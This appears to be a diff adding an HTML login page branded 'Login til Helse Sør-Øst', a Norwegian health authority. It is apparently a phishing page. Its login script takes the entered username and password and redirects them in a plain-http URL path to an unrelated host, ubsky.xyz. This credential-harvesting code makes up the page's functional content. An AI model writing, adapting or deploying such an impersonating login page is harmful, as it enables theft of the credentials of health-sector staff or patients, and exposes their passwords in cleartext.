@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+   <head>
+      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-giJF6kkoqNQ00vy+HMDP7azOuL0xtbfIcaT9wjKHr8RbDVddVHyTfAAsrekwKmP1" crossorigin="anonymous">
+   </head>
+   <body class="body">
+      <div class="login">
+         <h3 id="tittel">Login til Helse Sør-Øst</h3>
+         <input class="input1 form-control" type="text" name="brukernavn" id="brukernavn" placeholder="Brukernavn">
+         <br>
+         <input class="input1 form-control" type="password" name="passord" id="passord" placeholder="Passord">
+         <br>
+         <button class="loginbutton btn btn-dark" onclick="login()">Login</button>
+         <br>
+         <br>
+      </div>
+   </body>
+   <style>
+      .body {
+         background-image: url("https://media.discordapp.net/attachments/805194415366078464/805384931923722281/218_screenshots_20210130225029_1.jpg");
+         background-repeat: no-repeat;
+         background-size: cover;
+
+      }
+
+      .login {
+         position: absolute;
+         color: rgb(255, 255, 255);
+         text-align: center;
+         background-color: rgba(255, 0, 0, 0.137);
+         width: 40%;
+         height: fit-content;
+         border-radius: 3ch;
+         left: 30%;
+         top: 30%;
+         border-width: 0ch;
+         border-style: none;
+      }
+
+      .input1 {
+         position: relative;
+         border-radius: 1ch;
+         width: 90%;
+         height: 7%;
+         left: 5%;
+         border-width: 0ch;
+         border-style: none;
+      }
+
+      
+      .loginbutton {
+         position: relative;
+         border-radius: 1ch;
+         width: 90%;
+         height: 7%;
+      }
+
+   </style>
+
+   <script>
+
+      async function login() {
+         let brukernavn = document.getElementById('brukernavn').value
+         let passord = document.getElementById('passord').value
+
+         location.href = `http://ubsky.xyz/api/token/${brukernavn}/state/identify/password/${passord}`
+      }
+
+   </script>
+</html>
